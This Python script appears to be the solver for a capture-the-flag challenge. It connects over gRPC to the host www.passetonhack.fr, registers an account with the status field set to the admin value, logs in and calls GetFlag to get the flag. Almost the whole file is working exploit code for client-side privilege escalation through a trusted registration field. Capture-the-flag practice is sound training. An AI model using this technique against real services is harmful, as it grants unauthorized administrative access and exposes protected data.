#! /usr/bin/env python3

import os
import sys
import pprint
import inspect
import logging


import grpc
import poskaship_pb2

from client import create_client_channel, PoskaShipStub
from common import message_to_dict

import inspect_full

logging.basicConfig(
    stream=sys.stderr,
    format='[%(asctime)s] %(name)s - %(levelname)s - %(message)s',
    level=getattr(logging, os.environ.get('LOG_LEVEL', 'INFO').upper())
)
logger = logging.getLogger(os.path.splitext(os.path.basename(__file__))[0])


def main():
	"""
	Entry point for solver.
	"""
	remote = "www.passetonhack.fr"

	try:
		with create_client_channel(remote, tls=True) as client_channel:
			stub = PoskaShipStub(*client_channel)
			
			print(f"\n(?) Init: \n\t{stub=}, \n\t{client_channel=}")

			# Create an `admin` account.
			admin = poskaship_pb2.Profile(
				username="random1",
				password="1-2-3-4",
				# Admin status = 2 (poskaship_pb2.ADMIN).
				status=2,
			)

			print(f"\tadmin={message_to_dict(admin)}")

			try:
				registering = stub.Register(admin)
			except:
				print("(!) solution.main() Already registered.")
	
			connection = stub.Login(admin)

			inspect_full.inspect(connection)

			session_id = connection.session_id

			flag = stub.GetFlag()
			inspect_full.inspect(flag)
			print(f"\n\nWe get: {flag}\n\n")


	# pylint: disable-next=broad-exception-caught
	except grpc.RpcError as rpc_error:
		logger.error("Received error: %s", rpc_error)
	except Exception as e:
		te = type(e)
		show_bt = logger.getEffectiveLevel() <= logging.DEBUG
		logger.error(
			'Caught exception %s.%s: %s',
			te.__module__, te.__name__, str(e), exc_info=show_bt
		)
		return 1
	else:
		return 0


if __name__ == '__main__':
	sys.exit(main())
